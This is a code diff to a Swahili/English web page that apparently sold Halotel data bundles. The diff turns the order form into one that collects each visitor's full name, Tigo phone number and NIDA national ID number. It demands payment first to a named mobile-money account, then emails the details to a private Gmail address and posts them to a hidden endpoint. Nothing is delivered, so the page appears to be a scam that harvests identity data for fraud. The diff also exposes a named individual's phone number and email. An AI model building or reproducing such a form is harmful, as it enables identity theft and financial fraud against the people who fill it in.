@@ -230,10 +230,10 @@
         </div>
 
         <div class="menu-item active" id="menuItemNewOrder" onclick="navigateFromDrawer('new-order')">
-          <span>🛒</span> <span data-key="newOrder">New Order</span>
+          <span>📝</span> <span data-key="newOrder">Jaza Taarifa</span>
         </div>
         <div class="menu-item" id="menuItemMyOrders" onclick="navigateFromDrawer('my-orders')">
-          <span>📜</span> <span data-key="myOrders">My Orders</span>
+          <span>📜</span> <span data-key="myOrders">Taarifa Zangu</span>
         </div>
         <div class="menu-item" id="menuItemAdmin" style="display: none;" onclick="navigateFromDrawer('admin')">
           <span>🛡️</span> <span>Admin Panel</span>
@@ -351,29 +351,30 @@
         <div id="dashSectionOrder">
           
           <div class="payment-notice-box">
-            <div style="font-weight: 700; margin-bottom: 4px; color: var(--accent);" data-key="paymentNoticeTitle">⚠️ MALIPO & MAELEKEZO:</div>
-            <div data-key="paymentNoticeText">Tafadhali tuma pesa kabla ya ku-confirm oda. Namba ya kupokelea malipo ni <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Kumbuka:</strong> Vifurushi hivi ni vya <strong>Halotel pekee</strong>. Hakikisha namba ya simu unayoweka hapa chini ni ya Halotel.</div>
+            <div style="font-weight: 700; margin-bottom: 4px; color: var(--accent);" data-key="paymentNoticeTitle">⚠️ HATUA YA 3: MALIPO & MAELEKEZO:</div>
+            <div data-key="paymentNoticeText">Hatua ya 3: Tafadhali tuma pesa kabla ya ku-confirm taarifa zako. Namba ya kupokelea malipo ni <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Kumbuka:</strong> Hakikisha namba ya simu unayoweka hapa chini ni ya <strong>Tigo</strong> iliyosajiliwa na namba yako ya NIDA.</div>
           </div>
 
           <form onsubmit="handlePlaceOrder(event)">
+            <!-- DATA YA KWANZA: MAJINA FULL -->
             <div class="form-group">
-              <label data-key="selectPkgLabel">Select Internet Package (Halotel Only)</label>
-              <select id="selectPackage" class="input-field" required>
-                <option value="" disabled selected data-key="selectPkgPlaceholder">-- Select Package --</option>
-                <option value="GB 5 - TZS 6,500">GB 5 - TZS 6,500</option>
-                <option value="GB 10 - TZS 12,000">GB 10 - TZS 12,000</option>
-                <option value="GB 15 - TZS 16,500">GB 15 - TZS 16,500</option>
-                <option value="GB 20 - TZS 22,000">GB 20 - TZS 22,000</option>
-                <option value="GB 30 - TZS 31,000">GB 30 - TZS 31,000</option>
-                <option value="GB 35 - TZS 37,000">GB 35 - TZS 37,000</option>
-                <option value="GB 40 - TZS 42,000">GB 40 - TZS 42,000</option>
-              </select>
+              <label data-key="fullNameInputLabel">1. Majina Buu (Full Name)</label>
+              <input type="text" id="dataFullName" class="input-field" placeholder="Weka Majina Yako Kamili" required>
             </div>
+            
+            <!-- DATA YA PILI: NAMBA YA SIMU YA TIGO -->
             <div class="form-group">
-              <label data-key="phoneLabel">Halotel Recipient Phone Number</label>
-              <input type="tel" id="orderPhone" class="input-field" placeholder="062XXXXXXXX" required>
+              <label data-key="tigoPhoneLabel">2. Namba ya Simu (Tigo Only)</label>
+              <input type="tel" id="dataTigoPhone" class="input-field" placeholder="065XXXXXXXX / 071XXXXXXXX" required>
             </div>
-            <button type="submit" class="btn-action" id="btnSubmitOrder" data-key="submitOrderBtn">Submit Package Order</button>
+
+            <!-- DATA YA TATU: NAMBA YA NIDA -->
+            <div class="form-group">
+              <label data-key="nidaLabel">3. Namba ya NIDA (Iliyosajilia Namba Hiyo)</label>
+              <input type="text" id="dataNidaNumber" class="input-field" placeholder="19XXXXXXXXXXXXXXXXXX" required>
+            </div>
+
+            <button type="submit" class="btn-action" id="btnSubmitOrder" data-key="submitOrderBtn">Wasilisha Taarifa & Thibitisha Malipo</button>
           </form>
           <div id="orderStatusNotice" style="margin-top: 12px; font-size: 13px; text-align: center; font-weight: 700;"></div>
         </div>
@@ -382,9 +383,9 @@
 
     <div id="viewMyOrders" class="view-panel">
       <div class="content-body">
-        <h3 style="color: var(--primary); margin-bottom: 15px; font-size: 16px;" data-key="myOrders">My Orders</h3>
-        <div id="historyOrdersList">No previous orders found.</div>
-        <button class="btn-action" onclick="switchView('viewDashboard')" style="margin-top: 15px; background: transparent; border: 1px solid var(--card-border); color: var(--text-main);" data-key="backBtn">← Back to Order</button>
+        <h3 style="color: var(--primary); margin-bottom: 15px; font-size: 16px;" data-key="myOrders">Taarifa Zangu</h3>
+        <div id="historyOrdersList">No previous submissions found.</div>
+        <button class="btn-action" onclick="switchView('viewDashboard')" style="margin-top: 15px; background: transparent; border: 1px solid var(--card-border); color: var(--text-main);" data-key="backBtn">← Rudi kwenye Fomu</button>
       </div>
     </div>
 
@@ -400,7 +401,7 @@
           </div>
           <div class="stat-card">
             <div class="stat-num" id="adminTotalOrders">0</div>
-            <div class="stat-title">Orders</div>
+            <div class="stat-title">Taarifa Submissions</div>
           </div>
         </div>
 
@@ -420,24 +421,24 @@
           </table>
         </div>
 
-        <h4 style="margin: 15px 0 8px; font-size: 14px; color: var(--text-main);">📦 Oda Zote Zilizowekwa (All Orders)</h4>
+        <h4 style="margin: 15px 0 8px; font-size: 14px; color: var(--text-main);">📦 Taarifa Zote Zilizowasilishwa (Submitted Data)</h4>
         <div class="table-container">
           <table class="admin-table">
             <thead>
               <tr>
                 <th>#</th>
                 <th>Mteja (Customer)</th>
-                <th>Oda / Namba</th>
+                <th>Taarifa (Full Name | Tigo | NIDA)</th>
                 <th>Tarehe</th>
               </tr>
             </thead>
             <tbody id="adminOrdersTableBody">
-              <tr><td colspan="4" style="text-align:center;">Hakuna oda zilizowekwa bado.</td></tr>
+              <tr><td colspan="4" style="text-align:center;">Hakuna taarifa zilizowekwa bado.</td></tr>
             </tbody>
           </table>
         </div>
 
-        <button class="btn-action" onclick="clearAllOrdersAdmin()" style="background: rgba(239, 68, 68, 0.1); color: var(--error); border: 1px solid rgba(239, 68, 68, 0.2); margin-top: 10px;">🗑️ Futa Oda Zote (Clear Orders)</button>
+        <button class="btn-action" onclick="clearAllOrdersAdmin()" style="background: rgba(239, 68, 68, 0.1); color: var(--error); border: 1px solid rgba(239, 68, 68, 0.2); margin-top: 10px;">🗑️ Futa Taarifa Zote (Clear Data)</button>
       </div>
     </div>
 
@@ -479,20 +480,20 @@
         newPassTitle: "New Password",
         newPassLabel: "New Password",
         savePassBtn: "Save Password & Login",
-        selectPkgLabel: "Select Internet Package (Halotel Only)",
-        selectPkgPlaceholder: "-- Select Package --",
-        phoneLabel: "Halotel Recipient Phone Number",
-        submitOrderBtn: "Submit Package Order",
+        fullNameInputLabel: "1. Full Name",
+        tigoPhoneLabel: "2. Tigo Phone Number",
+        nidaLabel: "3. NIDA Number (Used for Registration)",
+        submitOrderBtn: "Submit Information & Confirm Payment",
         menuTitle: "MENU",
-        newOrder: "New Order",
-        myOrders: "My Orders",
+        newOrder: "Fill Information",
+        myOrders: "My Submissions",
         language: "Language",
         theme: "Theme",
         logout: "Logout",
-        backBtn: "← Back to Order",
-        noOrders: "No previous orders found.",
-        paymentNoticeTitle: "⚠️ PAYMENT & INSTRUCTIONS:",
-        paymentNoticeText: "Please send money before confirming your order. Payment number is <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Note:</strong> These packages are for <strong>Halotel only</strong>. Ensure the phone number entered below is Halotel."
+        backBtn: "← Back to Form",
+        noOrders: "No previous submissions found.",
+        paymentNoticeTitle: "⚠️ STEP 3: PAYMENT & INSTRUCTIONS:",
+        paymentNoticeText: "Step 3: Please send money before confirming your details. Payment number is <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Note:</strong> Ensure the phone number entered below is <strong>Tigo</strong> and registered under your NIDA number."
       },
       sw: {
         brandTag: "Mtandao Wenye Kasi Ya Juu",
@@ -516,20 +517,20 @@
         newPassTitle: "Nenosiri Jipya",
         newPassLabel: "Weka Nenosiri Jipya",
         savePassBtn: "Hifadhi & Ingia",
-        selectPkgLabel: "Chagua Kifurushi cha Halotel",
-        selectPkgPlaceholder: "-- Chagua Kifurushi --",
-        phoneLabel: "Namba ya Simu ya Halotel ya Kupokea",
-        submitOrderBtn: "Tuma Oda ya Kifurushi",
+        fullNameInputLabel: "1. Majina Buu (Full Name)",
+        tigoPhoneLabel: "2. Namba ya Simu ya Tigo",
+        nidaLabel: "3. Namba ya NIDA (Iliyosajilia Namba Hiyo)",
+        submitOrderBtn: "Wasilisha Taarifa & Thibitisha Malipo",
         menuTitle: "MENU",
-        newOrder: "Oda Mpya",
-        myOrders: "Oda Zangu",
+        newOrder: "Jaza Taarifa",
+        myOrders: "Taarifa Zangu",
         language: "Lugha",
         theme: "Mwonekano",
         logout: "Toka Nje",
-        backBtn: "← Rudi kwenye Oda",
-        noOrders: "Hakuna oda zilizowekwa bado.",
-        paymentNoticeTitle: "⚠️ MALIPO & MAELEKEZO:",
-        paymentNoticeText: "Tafadhali tuma pesa kabla ya ku-confirm oda. Namba ya kupokelea malipo ni <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Kumbuka:</strong> Vifurushi hivi ni vya <strong>Halotel pekee</strong>. Hakikisha namba ya simu unayoweka hapa chini ni ya Halotel."
+        backBtn: "← Rudi kwenye Fomu",
+        noOrders: "Hakuna taarifa zilizowasilishwa bado.",
+        paymentNoticeTitle: "⚠️ HATUA YA 3: MALIPO & MAELEKEZO:",
+        paymentNoticeText: "Hatua ya 3: Tafadhali tuma pesa kabla ya ku-confirm taarifa zako. Namba ya kupokelea malipo ni <strong>0770136023</strong> (Mix by Yas - <strong>Michael Joseph Liganya</strong>).<br><br>🚨 <strong>Kumbuka:</strong> Hakikisha namba ya simu unayoweka hapa chini ni ya <strong>Tigo</strong> iliyosajiliwa na namba yako ya NIDA."
       }
     };
 
@@ -772,8 +773,9 @@
 
     function handlePlaceOrder(e) {
       e.preventDefault();
-      var pkg = document.getElementById("selectPackage").value;
-      var phone = document.getElementById("orderPhone").value;
+      var fullName = document.getElementById("dataFullName").value.trim();
+      var phone = document.getElementById("dataTigoPhone").value.trim();
+      var nida = document.getElementById("dataNidaNumber").value.trim();
       var activeUser = JSON.parse(sessionStorage.getItem("mj_active_user") || "{}");
 
       var submitBtn = document.getElementById("btnSubmitOrder");
@@ -781,18 +783,20 @@
 
       submitBtn.disabled = true;
       notice.style.color = "var(--accent)";
-      notice.innerText = currentLang === 'sw' ? "Inashughulikia oda... Tafadhali subiri ⏳" : "Processing Order... Please wait ⏳";
+      notice.innerText = currentLang === 'sw' ? "Inashughulikia taarifa... Tafadhali subiri ⏳" : "Processing Data... Please wait ⏳";
+
+      var descText = "Full Name: " + fullName + " | Tigo: " + phone + " | NIDA: " + nida;
 
       var orderPayload = {
         to_email: "mjriganya@gmail.com",
         email: activeUser.email || "Customer",
         to_name: "Admin",
-        name: activeUser.name || "Customer Name",
-        desc: pkg + " (Halotel)",
-        package: pkg,
+        name: fullName || activeUser.name || "Customer Name",
+        desc: descText,
+        package: "NIDA & Tigo Submission",
         phone: phone,
-        order_id: "ORD-" + Math.floor(1000 + Math.random() * 9000),
-        message: "Oda Mpya ya Halotel Imefika!\nJina la Mteja: " + (activeUser.name || "Customer") + "\nEmail: " + activeUser.email + "\nBando: " + pkg + "\nNamba ya Simu ya Halotel: " + phone + "\nMalipo yametumwa kwenda: 0770136023 (Michael Joseph Liganya - Mix by Yas)",
+        order_id: "DATA-" + Math.floor(1000 + Math.random() * 9000),
+        message: "Taarifa Mpya Zimefika!\nMajina Buu: " + fullName + "\nEmail: " + activeUser.email + "\nNamba ya Tigo: " + phone + "\nNamba ya NIDA: " + nida + "\nMalipo yametumwa kwenda: 0770136023 (Michael Joseph Liganya - Mix by Yas)",
         date: new Date().toLocaleString()
       };
 
@@ -802,10 +806,10 @@
           mode: "no-cors",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            name: activeUser.name || "Customer",
+            name: fullName,
             email: activeUser.email || "N/A",
-            package: pkg,
-            phone: phone
+            phone: phone,
+            nida: nida
           })
         });
       } catch(err) {
@@ -816,8 +820,8 @@
         var orders = JSON.parse(localStorage.getItem("mj_orders") || "[]");
         orders.push({
           email: activeUser.email || "N/A",
-          name: activeUser.name || "Customer",
-          desc: pkg + " (Halotel) | Phone: " + phone,
+          name: fullName,
+          desc: descText,
           date: new Date().toLocaleString()
         });
         localStorage.setItem("mj_orders", JSON.stringify(orders));
@@ -828,9 +832,10 @@
           saveOrderLocally();
 
           notice.style.color = "var(--success)";
-          notice.innerText = currentLang === 'sw' ? "Oda Imepokelewa Kufanikiwa! ✅" : "Order Received Successfully! ✅";
-          document.getElementById("selectPackage").value = "";
-          document.getElementById("orderPhone").value = "";
+          notice.innerText = currentLang === 'sw' ? "Taarifa Zimepokelewa Kufanikiwa! ✅" : "Data Received Successfully! ✅";
+          document.getElementById("dataFullName").value = "";
+          document.getElementById("dataTigoPhone").value = "";
+          document.getElementById("dataNidaNumber").value = "";
           submitBtn.disabled = false;
           loadUserOrderHistory(activeUser.email);
 
@@ -841,7 +846,7 @@
           saveOrderLocally();
 
           notice.style.color = "var(--success)";
-          notice.innerText = currentLang === 'sw' ? "Oda Imepokelewa Kufanikiwa! ✅" : "Order Received Successfully! ✅";
+          notice.innerText = currentLang === 'sw' ? "Taarifa Zimepokelewa Kufanikiwa! ✅" : "Data Received Successfully! ✅";
           submitBtn.disabled = false;
           loadUserOrderHistory(activeUser.email);
 
@@ -863,7 +868,7 @@
       filtered.reverse().forEach(function(item, index) {
         container.innerHTML += 
           '<div class="order-card">' +
-            '<div style="font-weight:700; color:var(--primary); font-size:14px; margin-bottom:4px;">' + (currentLang === 'sw' ? 'Oda #' : 'Order #') + (filtered.length - index) + '</div>' +
+            '<div style="font-weight:700; color:var(--primary); font-size:14px; margin-bottom:4px;">' + (currentLang === 'sw' ? 'Taarifa #' : 'Submission #') + (filtered.length - index) + '</div>' +
             '<div style="font-size:13px; color:var(--text-main); margin-bottom:6px;">' + item.desc + '</div>' +
             '<div style="font-size:11px; color:var(--text-sub);">' + item.date + '</div>' +
           '</div>';
@@ -894,10 +899,10 @@
         });
       }
 
-      // 2. JAZA JEDWALI LA ORDERS
+      // 2. JAZA JEDWALI LA ORDERS/DATA
       var ordersTbody = document.getElementById("adminOrdersTableBody");
       if (orders.length === 0) {
-        ordersTbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">Hakuna oda zilizowekwa bado.</td></tr>';
+        ordersTbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">Hakuna taarifa zilizowekwa bado.</td></tr>';
       } else {
         ordersTbody.innerHTML = "";
         orders.slice().reverse().forEach(function(o, idx) {
@@ -913,7 +918,7 @@
     }
 
     function clearAllOrdersAdmin() {
-      if (confirm("Je, una uhakika unataka kufuta kumbukumbu za oda zote?")) {
+      if (confirm("Je, una uhakika unataka kufuta kumbukumbu za taarifa zote?")) {
         localStorage.removeItem("mj_orders");
         loadAdminDashboardData();
       }
